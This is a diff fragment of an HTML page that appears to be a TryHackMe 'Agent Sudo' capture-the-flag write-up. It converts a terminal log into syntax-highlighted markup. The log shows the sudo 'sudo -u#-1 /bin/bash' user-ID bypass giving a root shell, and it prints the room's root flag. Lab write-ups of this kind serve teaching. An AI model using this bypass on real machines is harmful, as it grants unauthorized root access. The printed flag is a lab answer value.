-cat: /root/root.txt: Permission denied
-james@agent-sudo:~$ sudo -u#-1 /bin/bash
-root@agent-sudo:~# cd /root
-root@agent-sudo:/root# cat root.txt
-To Mr.hacker,
+<div class="codehilite"><pre><span></span><code><span class="n">james</span><span class="nv">@agent</span><span class="o">-</span><span class="nl">sudo</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="nl">cat</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">root</span><span class="p">.</span><span class="nl">txt</span><span class="p">:</span><span class="w"> </span><span class="n">Permission</span><span class="w"> </span><span class="n">denied</span>
+<span class="n">james</span><span class="nv">@agent</span><span class="o">-</span><span class="nl">sudo</span><span class="p">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="err">#</span><span class="o">-</span><span class="mi">1</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="n">root</span><span class="nv">@agent</span><span class="o">-</span><span class="nl">sudo</span><span class="p">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">root</span>
+<span class="n">root</span><span class="nv">@agent</span><span class="o">-</span><span class="nl">sudo</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="err">#</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">root</span><span class="p">.</span><span class="n">txt</span>
+<span class="k">To</span><span class="w"> </span><span class="n">Mr</span><span class="p">.</span><span class="n">hacker</span><span class="p">,</span>
 
-Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+<span class="n">Congratulation</span><span class="w"> </span><span class="k">on</span><span class="w"> </span><span class="n">rooting</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">box</span><span class="p">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">box</span><span class="w"> </span><span class="n">was</span><span class="w"> </span><span class="n">designed</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">TryHackMe</span><span class="p">.</span><span class="w"> </span><span class="n">Tips</span><span class="p">,</span><span class="w"> </span><span class="n">always</span><span class="w"> </span><span class="k">update</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">machine</span><span class="p">.</span><span class="w"> </span>
 
-Your flag is 
-b53a02f55b57d4439e3341834d70c062
+<span class="n">Your</span><span class="w"> </span><span class="n">flag</span><span class="w"> </span><span class="k">is</span><span class="w"> </span>
+<span class="n">b53a02f55b57d4439e3341834d70c062</span>
 
-By,
-DesKel a.k.a Agent R
-root@agent-sudo:/root# 
-</code></pre>
+<span class="k">By</span><span class="p">,</span>
+<span class="n">DesKel</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">k</span><span class="p">.</span><span class="n">a</span><span class="w"> </span><span class="n">Agent</span><span class="w"> </span><span class="n">R</span>
+<span class="n">root</span><span class="nv">@agent</span><span class="o">-</span><span class="nl">sudo</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="err">#</span><span class="w"> </span>
+</code></pre></div>
         </div>
     </main>
 
